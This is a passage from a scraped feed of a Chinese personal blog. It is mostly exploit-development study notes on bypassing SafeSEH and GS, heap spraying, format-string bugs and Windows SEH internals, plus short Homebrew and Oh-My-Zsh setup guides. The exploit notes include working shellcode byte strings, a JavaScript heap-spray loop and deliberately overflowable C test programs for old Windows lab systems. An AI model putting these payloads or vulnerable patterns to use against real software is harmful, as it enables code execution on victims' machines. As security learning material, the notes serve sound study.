书上说此时触发除0异常将会转入shellcode跳板处，但是貌似事先未写入除0操作，于是再次编译插件，在test函数中加入除0操作 此时，成功在跳板处断下，EBP寄存器内的值是0x01DCF150，根据跳板指示将跳往跳板地址前的4个字节，在此可以加入一个跳转，而shellcode放到后方，如下所示 1 2 3 4 5 6 01DCF60C /EB 06 jmp short 01DCF614\t; jump 01DCF60E |90 nop 01DCF60F |90 nop 01DCF610 |1C 2D sbb al,0x2D\t; addr 01DCF612 |0B30 or esi,dword ptr ds:[eax]\t; addr 01DCF614 \\90 nop\t; shellcode payload start 最终的test函数如下所示 1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;script\u0026gt; var s = \u0026#34;\\u9090\u0026#34;; while (s.length \u0026lt; 136) { s += \u0026#34;\\u9090\u0026#34;; } s += \u0026#34;\\u06EB\\u9090\u0026#34;; s += \u0026#34;\\u2D1C\\u300B\u0026#34;; s += \u0026#34;\\u68fc\\u0a6a\\u1e38\\u6368\\ud189\\u684f\\u7432\\u0c91\\uf48b\\u7e8d\\u33f4\\ub7db\\u2b04\\u66e3\\u33bb\\u5332\\u7568\\u6573\\u5472\\ud233\\u8b64\\u305a\\u4b8b\\u8b0c\\u1c49\\u098b\\u698b\\uad08\\u6a3d\\u380a\\u751e\\u9505\\u57ff\\u95f8\\u8b60\\u3c45\\u4c8b\\u7805\\ucd03\\u598b\\u0320\\u33dd\\u47ff\\u348b\\u03bb\\u99f5\\ube0f\\u3a06\\u74c4\\uc108\\u07ca\\ud003\\ueb46\\u3bf1\\u2454\\u751c\\u8be4\\u2459\\udd03\\u8b66\\u7b3c\\u598b\\u031c\\u03dd\\ubb2c\\u5f95\\u57ab\\u3d61\\u0a6a\\u1e38\\ua975\\udb33\\u6853\\u616B\\u6F6F\\u4D68\\u7369\\u8B61\\u53c4\\u5050\\uff53\\ufc57\\uff53\\uf857\u0026#34;; test.test(s); \u0026lt;/script\u0026gt; 成功执行如图 ","date":"2020-11-12T09:40:00+08:00","permalink":"https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-013-safeseh%E7%AE%80%E4%BB%8B%E5%92%8C%E7%AE%80%E5%8D%95%E6%94%BB%E5%87%BB/","title":"漏洞利用学习笔记-013-SafeSEH简介和简单攻击"},{"content":"本文来源：Moeomu的博客\nGS安全编译的保护原理 简介 在Vistual Studio 2003(VS 7.0)后，默认启用了这个编译选项 位置：Project -\u0026gt; project Properties -\u0026gt; Configuration Properties -\u0026gt; C/C++ -\u0026gt; Code Generaion -\u0026gt; Buffer Security Check GS在所有函数调用发生时，向栈帧内压入了一个额外的随机DWORD，这个随机数被称为canary，这个随机数就是Security Cookie Security Cookie位于EBP之前，系统还将在.data的内存区域内存放了一个Security Cookie的副本 栈中发生溢出时，Security Cookie将首先被淹没，之后才是EBP和返回地址 在函数返回之前，系统将执行一个额外的安全验证操作，称为Security Check 在安全检查中，系统将比较栈帧中原先存放的Security Cookie的值和.data副本中的值，若两者不吻合说明Security Cookie已被破坏，栈中发生了溢出 检测到栈中发生溢出时，系统将进入异常处理流程，函数不会正常返回，ret指令也不会执行 额外的操作和数据的代价是系统性能的下降，所以以下情况不会应用GS： 函数不包含缓冲区 函数被定义为具有变量参数列表 函数使用无保护的关键字标记 函数在第一个语句中包含内嵌汇编代码 缓冲区不是8字节类型而且不大于4字节 由于这些例外，依旧出现了问题，搜易VS2005 SP1中引入了新的安全标识：#pragma strict_gs_check，它可以堆任意函数添加安全Cookie保证安全 变量重排： 根据局部变量的类型堆变量在栈帧中的位置进行调整，将字符串移动到栈帧的高地址防止字符串溢出时破坏其它的局部变量 还将指针参数和字符串参数赋值到内存的低地址 Security Cookie的细节 以.data节的第一个双字作为Cookie的种子，或称为原始Cookie(所有的函数的Cooike都用这个DWORD生成) 每次运行时Cookie种子都不同 栈帧初始化以后系统用ESP异或种子，作为当前函数的Cookie以此作为不同函数之间的区别增加Cookie随机性 函数返回前用ESP还原(异或)出Cookie的种子 Security Cookie的问题 基于改写函数指针的攻击很难防御 针对异常处理机制的攻击，GS很难防御 GS是对栈帧的保护，很难防御堆溢出攻击 利用未被保护的内存突破GS 测试环境：\nVisual Studio 2008 Professional Windows XP SP3 测试代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 #include \u0026lt;string.h\u0026gt; #include \u0026lt;tchar.h\u0026gt; int vulfuction(char* str) { char arry[4]; strcpy(arry, str); return 1; } int _tmain(int argc, _TCHAR* argv[]) { char* str = \u0026#34;yeah, the function is without GS\u0026#34;; vulfuction(str); return 0; } 按理来说，valfunction不包含4字节以上的缓冲区，所以此函数的栈空间应该是不受保护的，但是实际测试的时候却是有保护的，此问题待解决\n利用虚函数突破GS 只有函数在返回时才会检查栈，所以可以在函数返回前劫持流程\n代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 #include\u0026#34;string.h\u0026#34; class GSVirtual { public: void gsv(char * src) { char buf[200]; strcpy(buf, src); vir(); } virtual void vir(){} }; int main() { GSVirtual test; test.gsv( \u0026#34;\\x72\\x7A\\x81\\x7C\u0026#34; //address of \u0026#34;pop pop ret\u0026#34; \u0026#34;\\x1A\\x20\\x90\\x90\\x90\\x90\\x90\\x90\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\u0026#34; \u0026#34;\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\u0026#34; \u0026#34;\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\u0026#34; \u0026#34;\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\u0026#34; \u0026#34;\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\u0026#34; \u0026#34;\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\u0026#34; \u0026#34;\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\u0026#34; \u0026#34;\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\u0026#34; \u0026#34;\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\u0026#34; \u0026#34;\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB\\x53\\x68\\x6B\\x61\\x6F\\x6F\\x68\\x4D\u0026#34; \u0026#34;\\x69\\x73\\x61\\x8B\\xC4\\x53\\x50\\x50\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; ); return 0; } 说明 注意：测试环境为Windows XP SP3，编译版本为Release版本，编译器为Visual Studio 2008，编译选项为禁用编译优化/0d shellcode的前四个字节是以下汇编代码的地址，如果系统不是Windows XP SP3就需要修改 1 2 3 pop edi pop esi retn 覆写C++的虚表指针，使其指向跳板，如果需要平衡堆栈则寻找系统动态链接库中的一段指令作为跳板跳入shellcode 返回地址是垃圾指令则令其尽量不影响shellcode的执行，此处0x817C则是cmp指令，则此段汇编指令尽量让其不发生数据访问异常 此段shellcode将会弹窗 利用SEH突破GS GS并没有保护SEH，所以可以覆写SEH来实现劫持\n代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 #include\u0026lt;stdafx.h\u0026gt; #include\u0026lt;string.h\u0026gt; char shellcode[] = \u0026#34;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C\u0026#34; \u0026#34;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53\u0026#34; \u0026#34;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B\u0026#34; \u0026#34;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95\u0026#34; \u0026#34;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59\u0026#34; \u0026#34;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A\u0026#34; \u0026#34;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75\u0026#34; \u0026#34;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03\u0026#34; \u0026#34;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB\u0026#34; \u0026#34;\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50\u0026#34; \u0026#34;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;......\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\xA0\\xFE\\x12\\x00\u0026#34;//address of shellcode; void test(char * input) { char buf[200]; strcpy(buf,input); strcat(buf,input); } void main() { test(shellcode); } 说明 在函数test中存在栈溢出漏洞，变量input在strcpy后将会被覆盖，而strcat将会取得一个非法地址，函数啊将会转入SEH处理流程，我们可以在security_cookie检查之前劫持系统流程\n注意：测试环境为Windows 2000 SP4，编译版本为Release版本，编译器为Visual Studio 2005，编译选项为禁用编译优化/0d 使用Windows 2000的原因是为了防止SafeSEH的影响 待完成：Page:277 正面硬刚GS(替换.data中的原Cookie) 代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 #include\u0026lt;string.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; char Shellcode[] = \u0026#34;\\x90\\x90\\x90\\x90\u0026#34;//new value of cookie in .data \u0026#34;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C\u0026#34; \u0026#34;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53\u0026#34; \u0026#34;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B\u0026#34; \u0026#34;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95\u0026#34; \u0026#34;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59\u0026#34; \u0026#34;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A\u0026#34; \u0026#34;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75\u0026#34; \u0026#34;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03\u0026#34; \u0026#34;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB\u0026#34; \u0026#34;\\x53\\x68\\x6B\\x61\\x6F\\x6F\\x68\\x4D\\x69\\x73\\x61\\x8B\\xC4\\x53\\x50\\x50\u0026#34; \u0026#34;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\xF4\\x6F\\x82\\x90\u0026#34; // result of \\x90\\x90\\x90\\x90 xor EBP \u0026#34;\\x90\\x90\\x90\\x90\u0026#34; // Nop Code \u0026#34;\\x94\\xFE\\x12\\x00\u0026#34; // address of Shellcode ; void test(char * s, int i, char * src) { char dest[200]; if(i \u0026lt; 0x9995) { char* buf = s + i; *buf = *src; *(buf + 1) = *(src + 1); *(buf + 2) = *(src + 2); *(buf + 3) = *(src + 3); strcpy(dest, src); } } void main() { char* str = (char *)malloc(0x10000); test(str, 0xFFFF2FB8, Shellcode); } 说明 注意：测试环境为Windows XP SP3，编译版本为Release版本，编译器为Visual Studio 2008，编译选项为禁用编译优化/0d 当i为负数时，有可能指向.data节 test函数存在典型的栈溢出漏洞 目的：在栈溢出改掉security_cookie(ebp-0x4)的同时，将.data的前四个字节(原始cookie)也改为我们固定的值 细节 函数开始时计算security_cookie\n1 2 3 00401009 |. A1 00304000 mov eax,dword ptr ds:[__security_cookiedt\u0026gt; ; 从0x403000(.data)节前四个字节取得原cookie 0040100E |. 33C5 xor eax,ebp ; 用此值和eax异或运算 00401010 |. 8945 FC mov [local.1],eax ; 将此值放在ebp-0x4的地方 函数将要返回时验证security_cookie\n1 2 3 4 5 6 7 8 9 10 11 12 ... 004010CA |\u0026gt; \\8B4D FC mov ecx,[local.1] ; 将ebp-0x4的值取出放在ecx中 004010CD |. 33CD xor ecx,ebp ; 将ebp和ecx异或运算 004010CF |. E8 3D000000 call TestCons.__security_check_cookieionF\u0026gt; ; 调用__security_check函数验证cookie ... TestCons.__security_check: 00401111 \u0026gt; $ 3B0D 00304000 cmp ecx,dword ptr ds:[__security_cookiedt\u0026gt; ; 将ecx和0x403000(.data)的前四个字节比较 00401117 . 75 02 jnz short TestCons.0040111B ; 如果不相同则跳转到异常处理流程 00401119 . f3:c3 rep retn ; 返回 0040111B \u0026gt; E9 AC020000 jmp TestCons.__report_gsfailureokienFilte\u0026gt; ; 异常处理流程函数 ... ","date":"2020-11-11T16:45:00+08:00","permalink":"https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-012-gs%E5%AE%89%E5%85%A8%E7%BC%96%E8%AF%91/","title":"漏洞利用学习笔记-012-GS安全编译"},{"content":"大家请注意时效性：本文写于2020/11/10\u0026amp;\u0026amp;本文更新于2021/07/02\n本文来源：Moeomu的博客\n安装git 方法一：安装XCode Terminal:xcode-select --install 方法二：直接去git网站下载git的macOS安装包 安装HomeBrew 首先下载原版installer.sh的jsDelivr CDN镜像\n输入下列指令运行：\n1 2 3 4 5 git config --global url.\u0026#34;https://mirrors.ustc.edu.cn/homebrew-core.git\u0026#34;.insteadOf \u0026#34;https://github.com/Homebrew/homebrew-core\u0026#34; git config --global url.\u0026#34;https://mirrors.ustc.edu.cn/linuxbrew-core.git\u0026#34;.insteadOf \u0026#34;https://github.com/Homebrew/linuxbrew-core\u0026#34; git config --global url.\u0026#34;https://mirrors.ustc.edu.cn/brew.git\u0026#34;.insteadOf \u0026#34;https://github.com/Homebrew/brew\u0026#34; chmod +x install.sh HOMEBREW_BOTTLE_DOMAIN=https://mirrors.ustc.edu.cn/homebrew-bottles ./install.sh 通过USTC的git源克隆Homebrew-Cask项目\ncd /usr/local/Homebrew/Library/Taps/homebrew git clone https://mirrors.ustc.edu.cn/homebrew-cask.git 检查源配置 查看brew镜像源：git -C \u0026quot;$(brew --repo)\u0026quot; remote -v 查看homebrew-core镜像源：git -C \u0026quot;$(brew --repo homebrew/core)\u0026quot; remote -v 查看homebrew-cask镜像源：git -C \u0026quot;$(brew --repo homebrew/cask)\u0026quot; remote -v 合格的标准是这些源的地址全是USTC的网址 Update brew update 安装Oh-My-Zsh(非必须) 更新zsh：brew install zsh git克隆oh-my-zsh项目：git clone https://gitee.com/mirrors/oh-my-zsh.git 重命名项目：mv oh-my-zsh .oh-my-zsh 将模版复制到home目录下命名为.zshrc：cp .oh-my-zsh/templates/zshrc.zsh-template ~/.zshrc 退出Terminal，启动Terminal，成功 配置Terminal(非必须) 偏好设置-启动时，打开-使用描述文件新建窗口-Homebrew 偏好设置-描述文件-Homebrew-文本-字体-14点 配置Terminal代理(非必须) 1 2 export https_proxy=http://127.0.0.1:7809 export http_proxy=http://127.0.0.1:7809 ","date":"2020-11-10T19:43:00+08:00","permalink":"https://blog.moeomu.com/zh-cn/posts/homebrew%E5%92%8Cbrewcask%E7%9A%84%E5%AE%89%E8%A3%85/","title":"Homebrew和Brewcask的安装"},{"content":"zsh install and config\n本文来源：Moeomu的博客\n安装zsh macOS: brew install zsh Linux Arch Linux: sudo pacman -S zsh Ubuntu: sudo apt install zsh 克隆Git仓库(clone git repo) 中国大陆: git clone https://gitee.com/mirrors/oh-my-zsh.git 世界: git clone https://github.com/ohmyzsh/ohmyzsh.git 配置zsh(config) 设置为默认shell(set default shell) Set default shell: chsh -s /usr/bin/zsh Rename: mv oh-my-zsh .oh-my-zsh Set user profile: cp .oh-my-zsh/templates/zshrc.zsh-template ~/.zshrc 自动补全插件(auto suggestions plugin) git clone https://github.com/zsh-users/zsh-autosuggestions $ZSH_CUSTOM/plugins/zsh-autosuggestions edit ~/.zshrc: plugins=(git)=\u0026gt;plugins=(git zsh-autosuggestions) ","date":"2020-11-10T19:43:00+08:00","permalink":"https://blog.moeomu.com/zh-cn/posts/ohmyzsh%E5%AE%89%E8%A3%85%E6%8C%87%E5%8D%97/","title":"OhMyZsh安装指南"},{"content":"本文来源：Moeomu的博客\n格式化串漏洞 printf中的缺陷 例子\n1 2 3 4 5 6 7 8 #include \u0026#34;stdio.h\u0026#34; void main() { int a = 44,b = 77; printf(\u0026#34;a=%d, b=%d\\n\u0026#34;,a,b); printf(\u0026#34;a=%d, b=%d\\n\u0026#34;); } 上述代码中第二个调用缺少了输出数据的变量列表 然而第二次调用没有引起编译错误，程序正常执行 用printf读取内存数据 例子\n1 2 3 4 5 6 #include \u0026#34;stdio.h\u0026#34; int main(int argc, char ** argv) { printf(argv[1]); } 当我们向程序传入普通字符串，得到普通字符串 但是如果带有格式控制符，可以读出栈中的数据 用printf向内存中写数据 例子\n1 2 3 4 5 6 7 8 #include \u0026#34;stdio.h\u0026#34; int main(int argc, char ** argv) { int len_print = 0; printf(\u0026#34;before write: length=%d\\n\u0026#34;, len_print); printf(\u0026#34;Misaka:%d%n\\n\u0026#34;,len_print, \u0026amp;len_print); printf(\u0026#34;after write: length=%d\\n\u0026#34;, len_print); } %n控制符计算出了输出的字符串的长度，然后将它写回了len_print变量中 SQL注入攻击 原理 它源于PHP，ASP等脚本语言堆用户输入数据和解析时的缺陷 它不是二进制漏洞，在此不再讨论 Windows安全机制 图灵机的缺陷 代码和数据没有明确区分，所以总存在一些问题 例如堆栈溢出攻击，加壳脱壳技术，变形病毒技术 跨站脚本攻击，SQL注入攻击同样都是利用此缺陷造成的 Windows的变革 宏观变革 增加了Windows安全中心 为Windows添加了防火墙 未经允许，Web弹窗和ActiveX控件安装将禁止 IE7添加了筛选仿冒网站功能 添加了UAC(User Account Control)用户账户控制机制，防止恶意软件在未经许可的情况下在计算机上进行安装或者堆计算机进行更改 集成了Windows Defender，可以阻止，控制，删除间谍软件和恶意软件 内存安全的变革 使用GS编译技术，在函数返回地址前加入了SecurityCookie，在函数返回前首先检测SecurityCookie是否覆盖，栈溢出变得困难 增加了堆SEH的安全校验机制，有效防止大多数改写SEH而劫持进程的攻击 堆中加入了Heap Cookie，Safe Unlinking等安全机制，堆溢出的限制更多 DEP(Data Execution Protection)数据执行保护将数据部分标识为不可执行，阻止栈，堆和数据节中攻击代码的执行 ASLR(Address Space Layout Randomization)加载地址随机化技术通过堆系统关键地址的随机化，使得经典的堆栈溢出手段失效 SEHOP(Structured Exception Handler Overwrite Protection)SEH覆盖保护作为堆SEH安全机制的补充，将SEH的保护提升到系统级别，使得SEH的保护机制更有效 Windows安全机制汇总 Windows XP Windows 2003 Windows Vista Windows 2008 Windows 7 GS 安全Cookies √ √ √ √ √ 变量重排 √ √ √ √ √ 安全SEH SEH句柄验证 √ √ √ √ √ 堆保护 安全拆卸 √ √ √ √ √ 安全快表 × × √ √ √ Heap Cookie √ √ √ √ √ 元数据加密 × × √ √ √ DEP NX 支持 √ √ √ √ √ 永久DEP × × √ √ √ 默认OptOut × √ × √ × ASLR PEB, TEB √ √ √ √ √ 堆 × × √ √ √ 栈 × × √ √ √ 映像 × × √ √ √ SEHOP SEH链验证 × × √ √ √ ","date":"2020-10-25T18:50:00+08:00","permalink":"https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-011-%E5%85%B6%E5%AE%83%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%92%8Cwindows%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/","title":"漏洞利用学习笔记-011-其它类型的漏洞和Windows安全机制"},{"content":"声明：实验环境为 Windows 2000\n本文来源：Moeomu的博客\n简介 针对浏览器的攻击中，常常会结合使用堆和栈协同利用漏洞\n当浏览器或其使用的ActiceX控件中存在溢出漏洞时，攻击者就可以生成一个特殊的HTML文件来触发这个漏洞 不管是堆溢出还是栈溢出，漏洞触发后最终能够获得EIP 有时我们可能很难在浏览器中复杂的内存环境下不知完整的shellcode 页面中的JavaScript可以申请堆内存，因此shellcode通过JavaScript布置在堆中称为可能 shellcode放在堆中如何定位：HeapSpray 技术细节 在使用Heap Spray的时候，一般将EIP指向堆区0x0C0C0C0C位置，然后用JavaScript申请使用大量堆内存并用包含着0x90和shellcode的内存片覆盖这些内存 通常，JS会从低地址向高地址分配内存，因此申请的内存超过200MB的话，0x0C0C0C0C将被含有shellcode的内存片覆盖，只要内存片中的0x90能够命中0x0C0C0C0C，shellcode就可以执行 JS代码 1 2 3 4 5 6 7 8 9 10 11 12 13 var nop = unescape(\u0026#34;%u9090%u9090\u0026#34;); while(nop.length \u0026lt;= 0x100000/2) { nop+=nop; }//生成一个 1MB 大小充满 0x90 的数据块 nop = nop.substring(0, 0x100000/2 - 32/2 - 4/2 - shellcode.length - 2/2); var slide = new Arrary(); for (var i = 0; i \u0026lt; 200; i++) { slide[i] = nop + shellcode } 解释 每个内存片大小为1MB 首先产生一个大小为1MB而且全部被0x90填满的内存块 由于Java会为申请到的内存填上一些额外的信息，为了保证内存片是1MB，要将这些空间减去 我们使用200个这样的内存片来覆盖堆内存，只要任意一篇nop区可以覆盖0x0C0C0C0C，就可以成功 额外空间\nsize 说明 malloc header 32 byte 堆块信息 string length 4 byte 表示字符串长度 terminator 2 1 byte 堆块信息 实践 未完待续 ","date":"2020-10-25T17:56:00+08:00","permalink":"https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-010-heapspray/","title":"漏洞利用学习笔记-010-HeapSpray"},{"content":"声明：实验环境为 Windows XP SP3\n本文来源：Moeomu的博客\n不同级别的SEH 异常处理的最小作用域是线程，每个线程都拥有自己的SEH链表，发生错误时，首先使用自己的SEH进行处理 一个进程中可能同时存在很多个线程，进程中也由一个能处理全局的异常处理。当线程自身的SEH无法修复错误时，进程的SEH将处理异常。这种异常处理可能会影响到进程下属的所有线程 操作系统为所有程序提供了一个默认的异常处理函数，当所有的异常处理函数都无法处理错误时，这个默认的异常处理函数将被最终调用，结果一般时显示要给错误对话框 以下是简单的异常处理流程 首先执行线程中距离汉鼎最近的SEH或异常处理函数 若失败，则依次尝试执行SEH链表中后续的异常处理函数 若SEH链中所有的异常处理函数都没能处理异常，则执行进程的异常处理 若仍然失败，系统默认的异常处理函数将被调用，程序崩溃的对话框将弹出 线程的异常处理 线程通过TEB引用SEH链表依次尝试处理异常的过程\n用于异常处理的回调函数有4个参数 pExecpt：指向一个重要的结构体：EXCEPTION_RECORD，此结构包含了若干个与异常相关的信息，如异常的类型，异常发生的地址等 pFrame：指向栈帧中的SEH结构体 pContext：指向Context结构体，此结构体包含了所有寄存器的状态 pDispatch：未知 回调函数执行前，系统将上述异常发生时的断点信息压栈。更绝这些描述，回调函数可以轻松处理异常 回调函数返回后，操作系统会更具返回的结果决定下一步做什么。异常处理函数可能返回两种结果 0(Exception Continue Excetutuon)：代表异常成功处理，将返回程序发生异常的地方，继续执行后续指令 1(Exception Continue Search)：异常处理失败，将顺着SEH链表搜索其它可以用于异常处理的函数并尝试处理 UNWIND操作 异常发生时，操作系统将顺着SEH链表搜索处理异常的句柄，一旦找到，系统将已经遍历过的SEH异常处理函数再调用一遍 主要目的是通知前边处理异常失败的SEH，系统将它们遗弃了，请它们清理现场释放资源，之后将SEH结构体从链表中拆除 当pExcept指向的EXCEPTION_RECORD结构体中ExceptionCode被设置为0xC0000027(STATUS_UNWIND)，ExceptionFlags被设置为0x2(EH_UNWINDING)时，对回调函数的调用就属于unwind调用 此操作通过kernel.32中的一个导出函数RtlUnwind实现 在使用回调函数之前，系统将判断当前是否处于调试状态，如果是调试状态，将把异常交给调试器处理 EXCEPTION_RECORD\n1 2 3 4 5 6 7 8 typedef struct _EXCEPTION_RECORD { DWORD ExceptionCode; DWORD ExceptionFlags; //异常标志位 struct _EXCEPTION_RECORD *ExceptionRecord; PVOID ExceptionAddress; DWORD NumberParameters; DWORD ExceptionInformation [EXCEPTION_MAXIMUM_PARAMETERS]; } EXCEPTION_RECORD; RtlUnwind\n1 2 3 4 5 6 void RtlUnwind( PVOID TargetFrame, PVOID TargetIp, PEXCEPTION_RECORD ExceptionRecord, PVOID ReturnValue ); 进程异常处理 所有线程中发生的异常如果没有被线程或异常处理函数后者调试器处理掉，最终将交给进程中异常处理函数处理\n进程异常处理的回调函数需要通过API函数SetUnhandleExceptionFilter来注册 此函数返回值有3种 1(EXCEPTION_EXECUTE_HANDLER)：表示错误得到正确的处理，程序将退出。 0(EXCEPTION_CONTINUE_SEARCH)：无法处理错误，将错误转交给系统默认的异常处理。 -1(EXCEPTION_CONTINUE_EXECUTION)：表示错误得到正确的处理，并将继续执行下去。类似于线程的异常处理，系统会用回调函数的参数恢复出异常发生时的断点状况，但这时引起异常的寄存器值应该已经得到了修复。 SetUnhandleExceptionFilter\n1 2 3 LPTOP_LEVEL_EXCEPTION_FILTER SetUnhandledExceptionFilter( LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter ); 系统默认的异常处理UEF 如果进程异常处理失败或者程序没有进程异常处理，系统默认的异常处理函数UnhandledExceptionFilter()将被调用，这个函数是一个终极异常处理函数UEF(Unhandled Exception Filter)\nMSDN中将它称为“top-level exception handler”，即顶层异常处理，或是最后使用的异常处理\n在Windows 2000- Windows XP，此函数将检查注册表HKLM\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\AeDebug中的内容，Auto项标识是否弹出对话框，1表示不弹出直接结束程序，其它均会弹出 Debugger项目指明了系统默认调试器 异常流程总结 CPU执行捕获异常，内核接过控制权开始内核态异常处理 内核异常处理结束，将控制权交给用户态 用户态第一个处理异常的函数时ntdll.dll中的KiUserExceptionDispatcher()函数 此函数首先检查程序是否调试态，若被调试，将异常交给调试器处理 尝试加入VEH(Vectored Exception Handling)去处理异常 非调试态，调用RtlDispatchException()函数对线程的SEH链表进行遍历，若能找到处理异常的回调函数，将再次遍历先前调用过的SEH句柄，即unwind操作，保证异常处理机制的完整性 若栈中所有的SEH都失败了，进程拥有异常处理函数，将调用此函数 若自定义的进程异常处理失败，系统默认的UEF将被调用 其它异常处理利用思路 VEH的利用 WindowsXP开始，增加了一种新的异常处理：VEH(Vectored Exception Handler)向量化异常处理\nVEH和进程异常处理类似，都是基于进程，需要使用API注册回调函数 可以胡策多个VEH，结构体之间串成双向链表 处理优先级次于调试器处理，高于SEH处理 注册VEH可以执行它在链中的位置 VEH保存在堆中 unwind操作不会涉及VEH进程类的异常处理 VEH结构\n1 2 3 4 5 struct _VECTORED_EXCEPTION_NODE { DWORD m_pNextNode; DWORD m_pPreviousNode; PVOID m_pfnVectoredHandler; } VEH注册函数\n1 2 3 4 PVOID AddVectoredExceptionHandler( ULONG FirstHandler, PVECTORED_EXCEPTION_HANDLER 